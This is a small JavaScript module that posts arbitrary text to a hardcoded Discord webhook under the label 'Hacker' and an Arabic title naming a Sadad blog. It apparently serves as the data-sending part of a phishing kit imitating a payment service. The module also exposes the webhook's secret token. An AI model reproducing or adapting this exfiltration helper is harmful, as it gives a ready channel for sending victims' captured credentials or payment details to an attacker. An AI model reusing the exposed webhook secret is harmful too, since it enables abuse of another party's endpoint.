import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة سداد ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1322463929200410676/e85I9nREi24pof_i8bSOtxWWkkvgXxYs-vI-cJJJ3xVfKdmKn44_F-b0bhfSBQFAjON3",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
